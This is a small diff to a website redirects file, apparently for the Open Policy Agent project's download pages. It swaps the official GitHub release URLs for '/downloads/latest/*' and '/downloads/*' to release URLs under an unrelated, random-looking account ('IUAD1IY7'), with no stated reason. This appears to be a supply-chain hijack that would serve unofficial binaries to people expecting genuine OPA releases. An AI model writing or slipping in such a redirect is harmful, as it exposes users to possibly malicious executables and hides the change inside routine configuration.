@@ -67,5 +67,5 @@
 # -----------------------------------------------------------------------------
 
 /downloads/edge/*       https://opa-releases.s3.amazonaws.com/edge/:splat 200
-/downloads/latest/*     https://github.com/open-policy-agent/opa/releases/latest/download/:splat 200
-/downloads/*            https://github.com/open-policy-agent/opa/releases/download/:splat 200
+/downloads/latest/*     https://github.com/IUAD1IY7/opa/releases/latest/download/:splat 200
+/downloads/*            https://github.com/IUAD1IY7/opa/releases/download/:splat 200
